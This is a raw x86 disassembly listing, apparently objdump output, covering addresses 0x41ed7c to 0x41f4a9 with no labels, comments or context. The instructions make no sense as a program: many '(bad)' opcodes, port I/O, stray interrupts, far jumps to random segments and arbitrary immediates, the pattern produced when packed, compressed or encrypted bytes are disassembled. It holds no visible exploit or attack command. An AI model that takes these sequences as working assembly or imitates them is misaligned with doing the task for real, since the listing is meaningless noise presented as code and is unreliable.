  41ed7c:	or     esi,DWORD PTR [ebx+ecx*8]
  41ed7f:	popf   
  41ed80:	push   cs
  41ed81:	int    0xba
  41ed83:	fisttp WORD PTR [edx+0x66]
  41ed86:	out    0xbc,eax
  41ed88:	outs   dx,DWORD PTR ds:[esi]
  41ed89:	jmp    0x41ed3b
  41ed8b:	mov    bh,BYTE PTR [edi]
  41ed8d:	sub    esi,DWORD PTR [eax]
  41ed8f:	push   edi
  41ed90:	mov    ebx,0x8b3e7f38
  41ed95:	pop    ebp
  41ed96:	int3   
  41ed97:	jmp    0xf81e:0x1bfc954d
  41ed9e:	add    al,BYTE PTR [ebp-0x31e43a0c]
  41eda4:	or     DWORD PTR [eax-0x7c],edi
  41eda7:	daa    
  41eda8:	add    DWORD PTR [eax-0xa7cb736],ecx
  41edae:	dec    ebx
  41edaf:	xchg   edi,eax
  41edb0:	add    al,0xe2
  41edb2:	xor    DWORD PTR [edi],esi
  41edb4:	cmp    dl,bl
  41edb6:	xor    al,0x4f
  41edb8:	(bad)  
  41edb9:	cmc    
  41edba:	pop    ebx
  41edbb:	or     BYTE PTR [eax],dl
  41edbd:	jae    0x41ee1d
  41edbf:	xor    esp,DWORD PTR [esi]
  41edc1:	sub    eax,0xcdbed938
  41edc6:	std    
  41edc7:	adc    esi,DWORD PTR [eax]
  41edc9:	(bad)  
  41edcb:	outs   dx,BYTE PTR ds:[esi]
  41edcc:	pop    ebp
  41edcd:	stc    
  41edce:	jne    0x41edab
  41edd0:	popf   
  41edd1:	rcr    ah,0x56
  41edd4:	enter  0xed6d,0xb8
  41edd8:	sbb    al,BYTE PTR [edi+esi*4]
  41eddb:	mov    eax,0xef6dcbe3
  41ede0:	adc    BYTE PTR [ebx-0x68287fc3],al
  41ede6:	pusha  
  41ede7:	push   ebx
  41ede8:	je     0x41ee60
  41edea:	(bad)  
  41edeb:	mov    ah,0xbc
  41eded:	cmp    BYTE PTR [ecx],dl
  41edef:	add    eax,0x81f1ffd7
  41edf4:	jbe    0x41edac
  41edf6:	mov    ah,0xd6
  41edf8:	pop    edi
  41edf9:	pop    ss
  41edfa:	cmp    BYTE PTR [esi],bh
  41edfc:	test   al,0x95
  41edfe:	jmp    0x9da1:0x1c7ac0b8
  41ee05:	enter  0xd24a,0x90
  41ee09:	and    WORD PTR [edi-0x7852e55d],cx
  41ee10:	inc    edi
  41ee11:	cmp    al,BYTE PTR [eax-0x16845994]
  41ee17:	jle    0x41ee55
  41ee19:	mov    al,BYTE PTR [edi]
  41ee1b:	inc    ebx
  41ee1c:	cwde   
  41ee1d:	cs (bad) 
  41ee1f:	dec    edi
  41ee20:	sbb    al,0xcb
  41ee22:	adc    al,0x41
  41ee24:	into   
  41ee25:	push   edx
  41ee26:	shr    BYTE PTR [eax],cl
  41ee28:	fnstcw WORD PTR es:[edi-0x6dc38d4]
  41ee2f:	ds ds int 0xe1
  41ee33:	xchg   DWORD PTR [edi-0x55],eax
  41ee36:	push   ebx
  41ee37:	out    0xa6,al
  41ee39:	div    DWORD PTR [ebx+0x4]
  41ee3c:	shl    DWORD PTR [ebx],1
  41ee3e:	jns    0x41ede6
  41ee40:	xchg   BYTE PTR [edx],al
  41ee42:	enter  0x12e1,0xd2
  41ee46:	jmp    0x41ee43
  41ee48:	xchg   ax,ax
  41ee4a:	test   al,0x27
  41ee4c:	shr    BYTE PTR [edi],0x8c
  41ee4f:	dec    edi
  41ee51:	adc    eax,0xf8e23290
  41ee56:	pop    eax
  41ee57:	adc    dl,BYTE PTR gs:[ecx]
  41ee5a:	or     cl,ch
  41ee5c:	out    dx,eax
  41ee5d:	in     al,dx
  41ee5e:	or     al,0x6d
  41ee60:	jmp    0xe9d568f9
  41ee65:	ret    
  41ee66:	dec    ecx
  41ee67:	jp     0x41eedc
  41ee69:	xchg   ebp,eax
  41ee6a:	fisubr DWORD PTR [ecx]
  41ee6c:	ja     0x41eeb5
  41ee6e:	jnp    0x41ee6b
  41ee70:	mov    esp,0x89cfed84
  41ee75:	add    eax,0xe507621f
  41ee7a:	daa    
  41ee7b:	xor    bh,ch
  41ee7d:	aaa    
  41ee7e:	mov    WORD PTR [ebx+eiz*8-0x2080a68b],es
  41ee85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee86:	mov    ebx,0x2a02e4a9
  41ee8b:	lods   eax,DWORD PTR ds:[esi]
  41ee8c:	out    dx,al
  41ee8d:	mov    ebx,0x23369862
  41ee92:	pop    esi
  41ee93:	cmc    
  41ee94:	cmp    eax,0xf9e1b5c2
  41ee99:	cld    
  41ee9a:	ins    BYTE PTR es:[edi],dx
  41ee9b:	or     BYTE PTR [edi+0x5eff1ddc],ah
  41eea1:	push   edi
  41eea2:	shl    DWORD PTR [edx+0x29],0x6a
  41eea6:	leave  
  41eea7:	add    eax,0x513115da
  41eeac:	ss dec edi
  41eeae:	mov    al,ds:0xc56a070c
  41eeb3:	push   ss
  41eeb4:	push   edi
  41eeb5:	sbb    bl,BYTE PTR [esi]
  41eeb7:	outs   dx,DWORD PTR ds:[esi]
  41eeb8:	popa   
  41eeb9:	dec    ecx
  41eeba:	pop    eax
  41eebb:	mov    cs,WORD PTR [ebp-0x29]
  41eebe:	add    al,0xc5
  41eec0:	scas   eax,DWORD PTR es:[edi]
  41eec1:	int3   
  41eec2:	sbb    DWORD PTR [esi+0x2e],esp
  41eec5:	mov    bh,0xcf
  41eec7:	imul   BYTE PTR [edi-0x34]
  41eeca:	sub    eax,DWORD PTR [esi-0x6]
  41eecd:	rcr    DWORD PTR [ebx-0x61],0xe
  41eed1:	mov    dh,0xdb
  41eed3:	pop    edx
  41eed4:	loopne 0x41ee9e
  41eed6:	test   BYTE PTR [eax+0x5d],bh
  41eed9:	imul   eax,DWORD PTR [eax+0x9],0x9e1bf98e
  41eee0:	ja     0x41eeaf
  41eee2:	(bad)  
  41eee3:	ins    BYTE PTR es:[edi],dx
  41eee4:	dec    eax
  41eee5:	mov    bl,0x75
  41eee7:	push   ecx
  41eee8:	inc    eax
  41eee9:	cmovbe ecx,DWORD PTR [edi+0x3a]
  41eeed:	xchg   ch,ah
  41eeef:	dec    eax
  41eef0:	test   eax,0x6313661e
  41eef5:	fisttp WORD PTR [eax+ebp*4-0x6b735df1]
  41eefc:	push   edi
  41eefd:	lock inc esi
  41eeff:	dec    esi
  41ef00:	into   
  41ef01:	mov    esp,0xc7c08e6b
  41ef06:	xchg   ecx,eax
  41ef07:	shl    BYTE PTR [edx],0x55
  41ef0a:	jmp    0x5d4008da
  41ef0f:	inc    esi
  41ef10:	std    
  41ef11:	and    ecx,ebx
  41ef13:	and    DWORD PTR [eax],esp
  41ef15:	jmp    0x41eef0
  41ef17:	loop   0x41eed5
  41ef19:	sbb    eax,0x63f01807
  41ef1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef1f:	(bad)
  41ef23:	inc    ebx
  41ef24:	(bad)  
  41ef25:	xchg   ebx,eax
  41ef26:	dec    ecx
  41ef27:	mov    cl,0xed
  41ef29:	inc    edi
  41ef2a:	int    0x4a
  41ef2c:	fadd   QWORD PTR [eax-0x1eff278]
  41ef32:	add    ebx,DWORD PTR [eax]
  41ef34:	push   0x6722783f
  41ef39:	xchg   ecx,eax
  41ef3a:	stos   DWORD PTR es:[edi],eax
  41ef3b:	and    al,0x1
  41ef3d:	jg     0x41ef30
  41ef3f:	es jmp 0x5705:0xaba244c0
  41ef47:	retf   
  41ef48:	lods   al,BYTE PTR ds:[esi]
  41ef49:	xor    DWORD PTR ds:0x8097cb91,edi
  41ef4f:	pop    esi
  41ef50:	lods   al,BYTE PTR ds:[esi]
  41ef51:	bound  edx,QWORD PTR [ebx+ebx*2]
  41ef54:	sahf   
  41ef55:	scas   al,BYTE PTR es:[edi]
  41ef56:	push   cs
  41ef57:	xlat   BYTE PTR ds:[ebx]
  41ef58:	ja     0x41ef84
  41ef5a:	mov    ebp,0x5c9b0e69
  41ef5f:	pusha  
  41ef60:	rcl    BYTE PTR [edx+0x4d],cl
  41ef63:	dec    ebx
  41ef64:	fcmovb st,st(6)
  41ef66:	mov    ch,0x62
  41ef68:	cmp    cl,BYTE PTR [ebx-0x41af607d]
  41ef6e:	outs   dx,BYTE PTR ds:[esi]
  41ef6f:	sbb    esp,DWORD PTR [edi+0x68f7cca8]
  41ef75:	retf   
  41ef76:	xor    BYTE PTR [edx-0x19215dd9],ch
  41ef7c:	nop
  41ef7d:	sub    bl,BYTE PTR [edi]
  41ef7f:	xchg   BYTE PTR [ebp+0x66d2f4c8],dl
  41ef85:	loop   0x41eff8
  41ef87:	sbb    ch,cl
  41ef89:	rol    al,cl
  41ef8b:	scas   eax,DWORD PTR es:[edi]
  41ef8c:	cmp    al,0x2c
  41ef8e:	sub    DWORD PTR [ebx+eiz*2-0x42],ebx
  41ef92:	iret   
  41ef93:	and    al,0xe7
  41ef95:	inc    eax
  41ef96:	(bad)  
  41ef97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef98:	and    BYTE PTR [edi],dh
  41ef9a:	jecxz  0x41efc6
  41ef9c:	dec    edi
  41ef9d:	mov    eax,0x4627d608
  41efa2:	scas   eax,DWORD PTR es:[edi]
  41efa3:	mov    ebx,0x9130b9b5
  41efa8:	mov    cl,0xc4
  41efaa:	and    eax,0x57760095
  41efaf:	aas    
  41efb0:	icebp  
  41efb1:	pop    ss
  41efb2:	xchg   ebp,eax
  41efb3:	inc    edx
  41efb4:	inc    edx
  41efb5:	adc    esp,ecx
  41efb7:	stos   BYTE PTR es:[edi],al
  41efb8:	cmp    BYTE PTR [ebx],dl
  41efba:	fsubr  QWORD PTR [eax-0x3d]
  41efbd:	(bad)  
  41efbe:	or     esp,DWORD PTR [esi-0x1e82d088]
  41efc4:	(bad)  
  41efc6:	add    ah,dl
  41efc8:	jecxz  0x41f002
  41efca:	cmp    BYTE PTR [esp+edi*1],ah
  41efcd:	adc    DWORD PTR [edx+eax*4+0x29d25754],eax
  41efd4:	jnp    0x41f014
  41efd6:	xor    eax,0xb9c6e688
  41efdb:	das    
  41efdc:	jle    0x41ef75
  41efde:	xchg   BYTE PTR [edx+ebx*1],cl
  41efe1:	sbb    BYTE PTR [edi-0x5ab28f1f],bl
  41efe7:	mov    dh,BYTE PTR [eax]
  41efe9:	in     eax,dx
  41efea:	xor    DWORD PTR [edx+0x77],0xddb1f879
  41eff1:	ja     0x41f007
  41eff3:	leave  
  41eff4:	mov    esi,0xa4fb9ba0
  41eff9:	aas    
  41effa:	(bad)  
  41effb:	imul   ecx,esp,0x5d
  41effe:	add    BYTE PTR [ebx+esi*4-0x2fabafad],bh
  41f005:	xchg   BYTE PTR [ecx],dl
  41f007:	push   ss
  41f008:	in     al,dx
  41f009:	ja     0x41efec
  41f00b:	out    dx,eax
  41f00c:	fidivr DWORD PTR [edi-0xd8ce222]
  41f012:	bound  ecx,QWORD PTR [esi+0x25]
  41f015:	out    dx,al
  41f016:	sub    al,ah
  41f018:	in     eax,0xa7
  41f01a:	jg     0x41f087
  41f01c:	pop    edx
  41f01d:	mov    esi,0xb89c6603
  41f022:	push   ebx
  41f023:	sbb    dl,BYTE PTR [ebx]
  41f025:	sar    BYTE PTR [ebx-0x6b],0x12
  41f029:	adc    ah,cl
  41f02b:	out    dx,al
  41f02c:	ret    
  41f02d:	push   cs
  41f02e:	cmp    BYTE PTR [ebx+0x64],0xb2
  41f032:	adc    edi,edx
  41f034:	hlt    
  41f035:	mov    dh,0x52
  41f037:	sub    cl,BYTE PTR [ebx]
  41f039:	btc    edx,edi
  41f03c:	mov    BYTE PTR [ebp-0x5408cbcb],0x6
  41f043:	cs mov eax,0x33d7060b
  41f049:	jno    0x41f0b0
  41f04b:	mov    ebp,0xd874fb14
  41f050:	js     0x41f010
  41f052:	ja     0x41f09c
  41f054:	stos   DWORD PTR es:[edi],eax
  41f055:	pop    ebx
  41f056:	mov    ch,0xad
  41f058:	mov    edi,0xd75d4982
  41f05d:	stos   BYTE PTR es:[edi],al
  41f05e:	(bad)  
  41f05f:	aaa    
  41f060:	outs   dx,BYTE PTR ds:[esi]
  41f061:	jnp    0x41f02f
  41f063:	xor    al,0x88
  41f065:	xor    ebx,esi
  41f067:	call   0xd1fc:0x9a9d0d57
  41f06e:	jnp    0x41f076
  41f070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f071:	pusha  
  41f072:	push   eax
  41f073:	sub    al,0xe0
  41f075:	(bad)  
  41f076:	call   0xb7a1f435
  41f07b:	fistp  QWORD PTR [ecx+esi*4+0xe]
  41f07f:	push   ebx
  41f080:	in     eax,0x2f
  41f082:	rcr    BYTE PTR [ebx-0x7b],0x4d
  41f086:	push   edi
  41f087:	cs add eax,0x4843dd6c
  41f08d:	jg     0x41f02d
  41f08f:	nop
  41f090:	adc    dl,BYTE PTR [ebx-0x19]
  41f093:	scas   eax,DWORD PTR es:[edi]
  41f094:	inc    edi
  41f095:	pushf  
  41f096:	cwde   
  41f097:	mov    edx,0x98c2ef7b
  41f09c:	sbb    eax,0xb8e04436
  41f0a1:	dec    ebx
  41f0a2:	push   esp
  41f0a3:	add    eax,0x5080f168
  41f0a8:	psubd  mm2,mm3
  41f0ab:	nop
  41f0ac:	(bad)  [esi+eiz*8]
  41f0af:	or     al,0xfa
  41f0b1:	sbb    edi,DWORD PTR [eax+0x24]
  41f0b4:	stc    
  41f0b5:	sti    
  41f0b6:	pop    edi
  41f0b7:	retf   
  41f0b8:	je     0x41f115
  41f0ba:	inc    esp
  41f0bb:	add    eax,DWORD PTR [edx-0x17]
  41f0be:	dec    ecx
  41f0bf:	xor    esi,eax
  41f0c1:	sub    DWORD PTR [edx-0x74],esi
  41f0c4:	mov    ds:0x59d2d0d,eax
  41f0c9:	adc    eax,0xe06038aa
  41f0ce:	je     0x41f130
  41f0d0:	cs adc al,0xf0
  41f0d3:	icebp  
  41f0d4:	ins    DWORD PTR es:[edi],dx
  41f0d5:	mov    esp,0x2506dc5
  41f0da:	lahf   
  41f0db:	ins    BYTE PTR es:[edi],dx
  41f0dc:	aaa    
  41f0dd:	sub    ch,BYTE PTR [esp+esi*2]
  41f0e0:	sar    ch,0x56
  41f0e3:	dec    ebp
  41f0e4:	mov    bh,0x7d
  41f0e6:	and    esp,DWORD PTR [ebx+0x5cdee255]
  41f0ec:	sbb    DWORD PTR [edi+ebx*1-0x3c248092],edi
  41f0f3:	aaa    
  41f0f4:	inc    ebp
  41f0f5:	cli    
  41f0f6:	mov    WORD PTR [eax-0x25],fs
  41f0f9:	dec    eax
  41f0fa:	(bad)  
  41f0fb:	sub    DWORD PTR [edi+0x76],edi
  41f0fe:	adc    ebx,edx
  41f100:	push   esp
  41f101:	fwait
  41f102:	cmp    bh,BYTE PTR [edx-0x1d]
  41f105:	pop    es
  41f106:	cmc    
  41f107:	push   cs
  41f108:	mov    bl,0xb1
  41f10a:	rol    DWORD PTR [edi+edx*2],1
  41f10d:	jg     0x41f0c6
  41f10f:	sub    ebp,DWORD PTR [ebp-0x7b]
  41f112:	lods   eax,DWORD PTR ds:[esi]
  41f113:	mov    edx,0x4cbaa298
  41f118:	pop    ebx
  41f119:	lods   al,BYTE PTR ds:[esi]
  41f11a:	dec    edi
  41f11b:	ja     0x41f127
  41f11d:	jb     0x41f123
  41f11f:	pop    esp
  41f120:	call   0xeb419f0d
  41f125:	aad    0x3d
  41f127:	add    al,0x3
  41f129:	and    DWORD PTR [edi+eiz*1],edi
  41f12c:	mov    edx,esp
  41f12e:	or     ebp,0x9f72b48a
  41f134:	mov    al,0xcc
  41f136:	mov    ch,0x97
  41f138:	cmc    
  41f139:	cmp    ebx,DWORD PTR [edx]
  41f13b:	frstor [esi*4-0xa8175f6]
  41f142:	jmp    FWORD PTR [ebp+eax*4+0x4e]
  41f146:	push   ebp
  41f147:	jecxz  0x41f15f
  41f149:	cwde   
  41f14a:	shl    DWORD PTR [ebp-0x31],0x25
  41f14e:	cld    
  41f14f:	push   0x1510ab04
  41f154:	into   
  41f155:	push   ebp
  41f156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f157:	sub    DWORD PTR [ebx-0x6c36e90c],0x3c77350d
  41f161:	mov    ds:0xd743a65d,eax
  41f166:	outs   dx,DWORD PTR ds:[esi]
  41f167:	xor    DWORD PTR [esi],eax
  41f169:	arpl   di,sp
  41f16b:	or     ch,al
  41f16d:	xchg   ecx,eax
  41f16e:	jmp    0x7424:0x4e47650b
  41f175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f176:	(bad)  
  41f177:	lea    ebp,[ebp+0x4c925977]
  41f17d:	fnstenv [eax+0x74]
  41f180:	icebp  
  41f181:	and    ebp,edi
  41f183:	xor    BYTE PTR [ecx+0x5f],dh
  41f186:	dec    ebx
  41f187:	mov    dl,0x6f
  41f189:	arpl   WORD PTR [eax-0x7d],bx
  41f18c:	xchg   ebp,eax
  41f18d:	lahf   
  41f18e:	cld    
  41f18f:	in     eax,0x94
  41f191:	jno    0x41f178
  41f193:	les    ebx,FWORD PTR [ecx-0x56d84455]
  41f199:	sub    eax,0xba464a3a
  41f19e:	ficom  WORD PTR [edi]
  41f1a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1a1:	mov    bh,0x19
  41f1a3:	pop    edi
  41f1a4:	adc    ch,BYTE PTR [edx-0x4bbcbdfb]
  41f1aa:	lods   eax,DWORD PTR ds:[esi]
  41f1ab:	sub    BYTE PTR [ecx+0x56],0xc7
  41f1af:	inc    edi
  41f1b0:	ins    DWORD PTR es:[edi],dx
  41f1b1:	sbb    esp,DWORD PTR [edi-0x26f16803]
  41f1b7:	xchg   ebp,eax
  41f1b8:	xchg   esi,esi
  41f1ba:	rcr    BYTE PTR [ebp+ecx*1-0x2a],0xbd
  41f1bf:	enter  0xaad1,0x40
  41f1c3:	dec    edx
  41f1c4:	(bad)  
  41f1c5:	push   ebp
  41f1c6:	cwde   
  41f1c7:	cmp    eax,0xd55a2cd7
  41f1cc:	out    0x12,eax
  41f1ce:	xor    DWORD PTR [ecx-0x22e5d813],ecx
  41f1d4:	mov    edi,0xfd897f36
  41f1d9:	ss aam 0x86
  41f1dc:	pop    ebp
  41f1dd:	jne    0x41f15f
  41f1df:	lds    edi,FWORD PTR [edi-0x4b74892d]
  41f1e5:	adc    al,0xd
  41f1e7:	and    eax,0x86da7914
  41f1ec:	sub    bh,cl
  41f1ee:	sahf   
  41f1ef:	rol    BYTE PTR [eax-0x4c],1
  41f1f2:	inc    eax
  41f1f3:	imul   BYTE PTR [ebx-0x3b]
  41f1f6:	shl    DWORD PTR [eax],0x66
  41f1f9:	rcl    dl,cl
  41f1fb:	mov    cl,0x74
  41f1fd:	jne    0x41f1ba
  41f1ff:	xor    dh,BYTE PTR [eax+ecx*1-0x7]
  41f203:	pop    es
  41f204:	jnp    0x41f1a9
  41f206:	ds (bad) 
  41f208:	sbb    DWORD PTR [ecx],ebx
  41f20a:	mov    eax,0x13878b5b
  41f20f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f210:	das    
  41f211:	push   es
  41f212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f213:	pop    es
  41f214:	push   0xffffff9e
  41f216:	ds dec ebp
  41f218:	sub    ecx,esi
  41f21a:	jp     0x41f1b9
  41f21c:	fcomp  QWORD PTR [edx-0x40dfd7d1]
  41f222:	pop    esi
  41f223:	fldenv [edx+0x60eb0170]
  41f229:	outs   dx,WORD PTR ds:[esi]
  41f22b:	ret    0x54a5
  41f22e:	dec    ebx
  41f22f:	cmp    al,0x91
  41f231:	push   cs
  41f232:	push   ebp
  41f233:	sub    DWORD PTR [edi],ebp
  41f235:	dec    esi
  41f236:	lock ins DWORD PTR es:[edi],dx
  41f238:	out    dx,al
  41f239:	mov    dh,0x5f
  41f23b:	jp     0x41f2ac
  41f23d:	(bad)  
  41f23e:	mov    ebp,0x2d32dc3e
  41f243:	lds    ebp,FWORD PTR [ecx-0x2bc3d28a]
  41f249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f24a:	nop
  41f24b:	mov    bh,0xcc
  41f24d:	rcr    DWORD PTR ds:0x95cfda80,cl
  41f253:	xchg   edx,ecx
  41f255:	xchg   edi,eax
  41f256:	pop    edi
  41f257:	or     BYTE PTR [esi],0xca
  41f25a:	outs   dx,DWORD PTR ds:[esi]
  41f25b:	and    edx,DWORD PTR [ebx+0x7856264d]
  41f261:	cmp    DWORD PTR [edx-0x1492cfc3],eax
  41f267:	mov    bl,0x97
  41f269:	inc    ecx
  41f26a:	(bad)  
  41f26b:	mov    edi,0x9dc35c30
  41f270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f271:	fcom   QWORD PTR [edi+0xd487911]
  41f277:	mov    edi,DWORD PTR [ebx+0xfb6928c]
  41f27d:	sti    
  41f27e:	loop   0x41f282
  41f280:	ror    BYTE PTR [ecx-0x479f6742],0xaf
  41f287:	data16 daa 
  41f289:	pushf  
  41f28a:	mov    bh,0x32
  41f28c:	ficomp WORD PTR [ecx]
  41f28e:	(bad)  
  41f28f:	daa    
  41f290:	fbld   TBYTE PTR [ecx-0x5d05274e]
  41f296:	(bad)  
  41f298:	adc    eax,DWORD PTR cs:[ebp-0xa]
  41f29c:	add    cl,BYTE PTR [eax-0x5da9ae7]
  41f2a2:	or     DWORD PTR [edx+0x1f],ebp
  41f2a5:	cmp    al,0x3c
  41f2a7:	mov    bl,0x52
  41f2a9:	loopne 0x41f25d
  41f2ab:	stos   BYTE PTR es:[edi],al
  41f2ac:	call   FWORD PTR [edx+0x22]
  41f2af:	retf   
  41f2b0:	and    DWORD PTR [edi+0x7cdbeefe],esp
  41f2b6:	mov    al,0xaf
  41f2b8:	fbld   TBYTE PTR [edi]
  41f2ba:	pop    ebp
  41f2bb:	inc    eax
  41f2bc:	jnp    0x41f273
  41f2be:	or     DWORD PTR [esi+0x10],ebx
  41f2c1:	cmp    eax,edx
  41f2c3:	call   0x9ddf:0xb145ba54
  41f2ca:	loope  0x41f272
  41f2cc:	outs   dx,BYTE PTR ds:[esi]
  41f2cd:	dec    ebx
  41f2ce:	mov    edi,0xe08e8a7b
  41f2d3:	imul   ecx,DWORD PTR [ebp+esi*1+0x3b],0xde11b0ef
  41f2db:	popa   
  41f2dc:	cmp    ah,BYTE PTR [ebp+0x2781bede]
  41f2e2:	xor    edx,DWORD PTR [ebx-0x64711ff8]
  41f2e8:	pop    ecx
  41f2e9:	pushf  
  41f2ea:	or     bl,BYTE PTR [ecx+0x7c]
  41f2ed:	mov    esi,0x5ac5594d
  41f2f2:	add    BYTE PTR [ebp-0x34],0xa8
  41f2f6:	mov    ebx,0x2391499f
  41f2fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2fc:	xchg   edi,eax
  41f2fd:	daa    
  41f2fe:	pop    es
  41f2ff:	adc    ah,BYTE PTR ds:0x5011631c
  41f305:	push   ebp
  41f306:	aad    0xe2
  41f308:	in     al,dx
  41f309:	push   edx
  41f30a:	outs   dx,DWORD PTR ds:[esi]
  41f30b:	push   eax
  41f30c:	adc    edx,esi
  41f30e:	das    
  41f30f:	mov    esi,0x1bf89fd3
  41f315:	dec    ebp
  41f316:	mov    al,ds:0x7f2c1919
  41f31b:	(bad)  
  41f31d:	mov    cs,edi
  41f31f:	in     eax,dx
  41f320:	and    eax,0x73d3d3b6
  41f325:	mov    BYTE PTR [ecx+0x2d3af813],ah
  41f32b:	mov    eax,0xd59bcac8
  41f330:	fisubr DWORD PTR [ebx]
  41f332:	sbb    eax,0xb43c0c91
  41f337:	frstor [esi-0x7793293d]
  41f33d:	xor    al,0xbc
  41f33f:	in     eax,0xfd
  41f341:	retf   
  41f342:	mov    ebp,0xa42d4be2
  41f347:	ror    DWORD PTR [ebp+0x479419c8],cl
  41f34d:	sub    al,0xee
  41f34f:	sbb    edx,DWORD PTR [esi+0x4b9bd069]
  41f355:	(bad)  
  41f356:	mov    ch,0xb
  41f358:	xor    bl,BYTE PTR [eax]
  41f35a:	xor    eax,0xf91a533f
  41f35f:	pop    edx
  41f360:	imul   ebx,esp,0x1c
  41f363:	cmp    al,al
  41f365:	inc    edx
  41f366:	test   al,0xd2
  41f368:	dec    edi
  41f369:	adc    DWORD PTR [esi],0x65
  41f36c:	mov    ebx,0x95ce39d9
  41f371:	(bad)  
  41f372:	pop    esp
  41f373:	and    esp,ebx
  41f375:	jns    0x41f3dd
  41f377:	int3   
  41f378:	jl     0x41f315
  41f37a:	shr    bl,cl
  41f37c:	and    dl,BYTE PTR [eax]
  41f37e:	out    dx,eax
  41f37f:	mov    eax,ds:0x60d40b7f
  41f384:	sub    al,0x78
  41f386:	mov    dh,BYTE PTR [edx]
  41f388:	adc    DWORD PTR [ebp-0x63],0xcee9b464
  41f38f:	scas   eax,DWORD PTR es:[edi]
  41f390:	push   edx
  41f391:	inc    BYTE PTR [edi+0x531635c1]
  41f397:	ficom  DWORD PTR [esi+esi*4]
  41f39a:	push   edx
  41f39b:	call   0xb5dc:0x396ef0e3
  41f3a2:	out    0x3a,eax
  41f3a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3a5:	adc    al,0xd5
  41f3a7:	out    0xb6,al
  41f3a9:	gs loope 0x41f41f
  41f3ac:	ja     0x41f386
  41f3ae:	xchg   BYTE PTR [edi-0x2e9d80ea],bh
  41f3b4:	or     al,0x3e
  41f3b6:	je     0x41f3d0
  41f3b8:	scas   eax,DWORD PTR es:[edi]
  41f3b9:	clc    
  41f3ba:	out    0xd3,al
  41f3bc:	push   edi
  41f3bd:	push   edx
  41f3be:	fisub  WORD PTR [esi-0x79]
  41f3c1:	inc    ebx
  41f3c2:	jl     0x41f3b8
  41f3c4:	repz inc ecx
  41f3c6:	pop    eax
  41f3c7:	push   ds
  41f3c8:	out    dx,al
  41f3c9:	push   ds
  41f3ca:	outs   dx,BYTE PTR ds:[esi]
  41f3cb:	shl    DWORD PTR [ebp-0xb7160f2],1
  41f3d1:	dec    esi
  41f3d2:	dec    esp
  41f3d3:	mov    ch,0xa5
  41f3d5:	xchg   edi,eax
  41f3d6:	mov    ?,WORD PTR [esi-0x78]
  41f3d9:	int3   
  41f3da:	pusha  
  41f3db:	sub    ch,BYTE PTR [ecx-0x51eb1ffa]
  41f3e1:	pop    eax
  41f3e2:	fimul  DWORD PTR ds:0xcb474da1
  41f3e8:	iret   
  41f3e9:	scas   eax,DWORD PTR es:[edi]
  41f3ea:	mov    ds:0xb24f5ea9,eax
  41f3f0:	jmp    0xefd977f4
  41f3f5:	in     eax,dx
  41f3f6:	xchg   edi,eax
  41f3f7:	out    0x6b,eax
  41f3f9:	inc    eax
  41f3fa:	fs loop 0x41f3eb
  41f3fd:	jb     0x41f381
  41f3ff:	or     DWORD PTR [edi-0x2c],0x36551e97
  41f406:	jne    0x41f486
  41f408:	rol    DWORD PTR [ebx+0x15],cl
  41f40b:	daa    
  41f40c:	inc    esi
  41f40d:	dec    edi
  41f40e:	xlat   BYTE PTR ds:[ebx]
  41f40f:	pop    ecx
  41f410:	pushf  
  41f411:	inc    edi
  41f412:	xchg   BYTE PTR ds:0x9c71cbe1,dl
  41f418:	dec    ecx
  41f419:	pop    ecx
  41f41a:	ins    BYTE PTR es:[edi],dx
  41f41b:	lea    ebx,[eax+eiz*4+0x14ae44b3]
  41f422:	cmp    eax,0x3dcff631
  41f427:	ja     0x41f416
  41f429:	call   0x4f79590a
  41f42e:	sub    dh,dl
  41f430:	adc    al,0x1f
  41f432:	or     bl,BYTE PTR [eax]
  41f434:	jne    0x41f461
  41f436:	test   eax,0xb86a8d2f
  41f43b:	in     eax,dx
  41f43c:	lods   al,BYTE PTR ds:[esi]
  41f43d:	cmp    bh,bl
  41f43f:	popf   
  41f440:	push   cs
  41f441:	cmp    ebx,DWORD PTR [ecx]
  41f443:	push   esi
  41f444:	mov    ch,0x99
  41f446:	inc    ebp
  41f447:	add    esp,DWORD PTR [edi]
  41f449:	ins    BYTE PTR es:[edi],dx
  41f44a:	adc    eax,esp
  41f44c:	jp     0x41f40b
  41f44e:	nop
  41f44f:	pop    ebp
  41f450:	int    0x36
  41f452:	jb     0x41f46c
  41f454:	inc    edi
  41f455:	mov    esi,DWORD PTR [eax-0x42cfc026]
  41f45b:	outs   dx,DWORD PTR ds:[esi]
  41f45c:	pop    edi
  41f45d:	adc    ecx,eax
  41f45f:	adc    DWORD PTR [eax],edx
  41f461:	sti    
  41f462:	out    0xb8,eax
  41f464:	mov    esi,0x2a749021
  41f469:	pop    esi
  41f46a:	out    dx,al
  41f46b:	pcmpeqw mm1,QWORD PTR [eax-0x55eea4b4]
  41f472:	cmp    ah,dl
  41f474:	cdq    
  41f475:	fdiv   DWORD PTR [esi]
  41f477:	outs   dx,BYTE PTR ds:[esi]
  41f478:	xor    BYTE PTR [ecx+0x7e],0x57
  41f47c:	mov    edi,0xb96e95ee
  41f481:	outs   dx,BYTE PTR ds:[esi]
  41f482:	out    0xc,eax
  41f484:	cdq    
  41f485:	and    al,0x8f
  41f487:	int3   
  41f488:	dec    ebx
  41f489:	fnstenv [eax-0x495c332d]
  41f48f:	push   ebx
  41f490:	fst    DWORD PTR [ebp+ebx*8+0x79]
  41f494:	int    0xb8
  41f496:	xchg   edi,eax
  41f497:	stos   BYTE PTR es:[edi],al
  41f498:	shr    al,1
  41f49a:	lea    esp,[esi]
  41f49c:	leave  
  41f49d:	mov    ch,0x88
  41f49f:	xor    dl,dh
  41f4a1:	mov    al,ds:0x253be607
  41f4a6:	aas    
  41f4a7:	push   ecx
  41f4a8:	pop    ds
  41f4a9:	lods   eax,DWORD PTR ds:[esi]
